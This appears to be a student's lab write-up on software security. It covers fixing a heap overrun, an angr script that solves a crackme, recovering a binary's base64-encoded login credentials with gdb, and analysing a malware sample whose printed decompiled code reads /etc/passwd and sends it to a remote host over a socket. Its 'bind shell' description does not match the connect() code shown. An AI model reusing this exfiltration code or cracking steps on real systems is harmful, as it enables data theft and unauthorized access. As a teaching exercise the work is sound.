### EXERCISE 1

1.

Compiling c source code with gcc
```bash
$: gcc A.c -o a.out
```

__Errors detected :__

![heap_block_overrun](../task5/images/heap_block_overrun.PNG)

__Category of error :__ Heap block overrun

__Fix:__
Change the allocates size to 11. (`line no: 6`)
```c
    x = (char *) malloc(11 * sizeof(char));
```

### Exercise 3: angr

1. Using IDA or any other tool, show the Control Flow Graph (CFG) of the program

Tool used: __Ghidra__

![example5_uninitialized_x](../task5/images/control_flow_graph.PNG)



__3. Write a python script with using angr to solve the task and give a valid serial__

```python
import angr
import claripy


SUCCESS_ADDR = 0x00400677
FAILURE_ADDR = 0x00400683
FLAG_LEN = 6
STDIN_FD = 0


base_addr = 0x00400000 # To match addresses to Ghidra

proj = angr.Project("./crackme3.o", main_opts={'base_addr': base_addr}) 

flag_chars = [claripy.BVS('flag_%d' % i, 8) for i in range(FLAG_LEN)]
flag = claripy.Concat( *flag_chars + [claripy.BVV(b'\n')]) # Add \n for scanf() to accept the input

state = proj.factory.full_init_state(
        args=['./crackme3.out'],
        add_options=angr.options.unicorn,
        stdin=flag,
)

# Add constraints that all characters are printable
for k in flag_chars:
    state.solver.add(k >= ord('!'))
    state.solver.add(k <= ord('~'))

simgr = proj.factory.simulation_manager(state)
simgr.explore(find=SUCCESS_ADDR, avoid=FAILURE_ADDR)

if (len(simgr.found) > 0):
    for found in simgr.found:
        print(found.posix.dumps(STDIN_FD))
```


### Exercise 4: American Fuzzy Lop (afl)


### Reverse engineering

__1. Check for implemented security features. What did you find?__

- used the following command to find the security meachnaisms implemented for the binary

```bash
checksec <binary>
```

```bash
┌──(shashi@kali)-[~/lab2/LabCode_Part5]
└─$ checksec RE.warmup
[*] '/home/kali/lab2/LabCode_Part5/RE.warmup'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled

```

__2. The Program is asking for credentials to access. Retrieve the correct credentials and use them to login.__

```bash
shashi@kali-[~]
─$ ./RE.warmup 
Enter USER ID and PASSWORD below (You have only three chances to enter)
USER ID: R007B0553210

PASSWORD: 7oorM0On3210

You have logged in successfully.   
```

__3. Show your work. How did you break in?__

__solution :__
__step 1:__ Run the binary in debugger (GDB)  and set breakpoint in main.

```bash
┌──(shashi@kali)-[~/lab2/LabCode_Part5]
└─$ gdb -q ./RE.warmup
Reading symbols from ./RE.warmup...
(No debugging symbols found in ./RE.warmup)
(gdb) set disassembly-flavor intel
(gdb) break main
Breakpoint 1 at 0xba3

```
__step 2:__ run the program  as `breakpoint 1`  is hit, disassemble main and look for first `strcmp` function (persumably this comparision is for `USERID`) and set breakpoint at that specific address.
![strcmp_breakpoint](../task5/images/strcmp_breakpoint.png)
```bash
(gdb) break *0x0000555555400cfb
Breakpoint 2 at 0x555555400cfb
```

__step 3 :__ Continue the program by entering `USERID` as `9` and `PASSWORD` as `5` 

```bash
(gdb) c
Continuing.

Enter USER ID and PASSWORD below (You have only three chances to enter)
USER ID: 9

PASSWORD: 5

Breakpoint 2, 0x0000555555400cfb in main ()
```
__step 4:__  As `strcmp`  breakpoint (`Breakpoint 2, 0x0000555555400cfb in main()`) is hit, step-inside the function and examine the registers.

```bash
(gdb) stepi
0x0000555555400810 in strcmp@plt ()
(gdb) info registers
rax            0xfffffffa          4294967290

r13            0x7fffffffdf21      140737488346913
r14            0xffffffffffffffff  -1
r15            0x555555400f0b      93824990842635
rip            0x555555400810      0x555555400810 
...

```

```bash
(gdb) x/s 0x555555603ae0
0x555555603ae0: "NQ=="
(gdb) x/s 0x7fffffffdf50
0x7fffffffdf50: "N29vck0wT24zMjEw"
(gdb) x/s 0x7fffffffdef8
0x7fffffffdef8: ""
(gdb) x/s 0x7fffffffdf21
0x7fffffffdf21: "9"
```

- after examing the all the register contents, the pecular thing, that found  `NQ==` (which clearly not my input), which on observing, found out that it is `base64` encoded string of `5`, which is the password I entered.

```bash
┌──(shashi@kali)-[~]
└─$ echo "NQ==" | base64 -d                          
5  
```

__step 5:__ Since the comparison is happening(assumed) with base64 encoded string, ran `strings` command on the binary to see if there are any corresponding strings.
![strings_RE.warmup.png](../task5/images/strings_RE.warmup.png)

> These strings can be found in registers when debugging in GDB , which is being compared with out `username` and `password` values

- Found strings

```
UjAwN0IwNTUzMjEw  
N29vck0wT24zMjEw 
```
__step 6:__ Decode the strings with `base64`

```bash                                              
┌──(shashi@kali)-[~/lab2/LabCode_Part5]
└─$ echo "UjAwN0IwNTUzMjEw" | base64 -d 
R007B0553210  

┌──(shashi@kali)-[~/lab2/LabCode_Part5]
└─$ echo "N29vck0wT24zMjEw" | base64 -d 
7oorM0On3210 
```

> `H` found in end of the strings, resulted as junk value when decoded, as it likely a new line character and ignored when decoding.

__4. Propose a better way to protect the program__
__solution :__
1. Use code obfuscation.
2. Detecting debuggers and sandboxes
3. Strip the symbols
4. randomize the stored data
5. Runtime calculations of data



#### Analysing `Worse` Binary

__1. What does this malware sample do? Explain how did you find this information.__
__solution__

1. Connects to host
```bash
hostname = gethostbyname("thebeautifulrabbitisjumpingaroundlolwhatisthisapenny.com");
```
2. If the host does not exist, write `"nice try noob \n"`on to the screen.
3. If it exists, writes `loooooooool ^_^\n` to the screen.
4. Decrypt `IP` and `credentials`

```c++
decryptip(local_486)
decryptcred(local_498);
```

5. copy the decrypted credentiuals (first 16 bytes) into creds_array.

```c++
 local_c = 0;
  while (local_c < 0x10) {
    creds_array[local_c] = credentials[local_c];
    local_c = local_c + 1;
  }
```

6. uses bzero to erases `1024 bytes (x400)` bytes from the given location.

```c++
bzero(to_erase_location,0x400);
```

7. open the `/etc/passwd` file and reads its contents

```c
etc_file_descripter = fopen("/etc/passwd","rb");
```

8.
    - If the file is available then
    - move file pointer associated with  `etc_file_descripter` to a specific position given. (`fseek()`)
    - Get the `etc/passwd` file size using `ftell` and the same amount of memory using `malloc`.
    - if the buffer is not null, read the file contents using fread.
    - close the file descriptor.

```c
  if (etc_file_descripter != (FILE *)0x0) {
    fseek(etc_file_descripter,0,2);
    etc_passwd_file_Size = ftell(etc_file_descripter);
    fseek(etc_file_descripter,0,0);
    etc_buffer = (char *)malloc(etc_passwd_file_Size);
    if (local_20 != (char *)0x0) {
      fread(etc_buffer,1,etc_passwd_file_Size,etc_file_descripter);
    }
    fclose(etc_file_descripter);
```

9. creates a bind shell on `port 1337`

Socket configuration found:
```c
port = 0x343f;
  socket_socket = socket(2,1,0);
  if (socket_socket < 0) {
    error("ERROR opening socket");
  }
```

Configuration of above socket is , as follows

```c
int socket(intdomain, int type, int protocol);  //creates an endpoint for communication and returns a file descriptor that refers to that endpoint.
    socket(AF_INET, SOCK_STREAM, PROTOCOL) 
    socket(2, 1, 0)
```

10. copy the ip address using `memcpy`

```c
    memcpy(copied_ip,ip_address,0xc); 
```

11. Now, `getthehostbyname` using the `copied_ip` and write `ERROR, no such host` if it is empty

```c
host_by_name = gethostbyname(copied_ip);  
  if (host_by_name == (hostent *)0x0) {
    fwrite("ERROR, no such host\n",1,0x14,stderr);
    exit(0);
```

12. make a socket connection

```c
iVar2 = connect(socket_socket,(sockaddr *)local_478,0x10)
  if (iVar2 < 0) {
    error("ERROR connecting");
  }
```
13. use `write` to write the `etc/passswd` contents and prints "ERROR writing" if the read contnets is empty.

```
    php_page = "/qwertylolnotqwerty1337.php"; 
      etc_buffer_length = strlen(etc_buffer);
      sVar3 = write(socket_socket,etc_buffer,etc_buffer_length);
      local_54 = (int)sVar3;
      if (local_54 < 0) {
        error("ERROR writing to socket");
      }
```
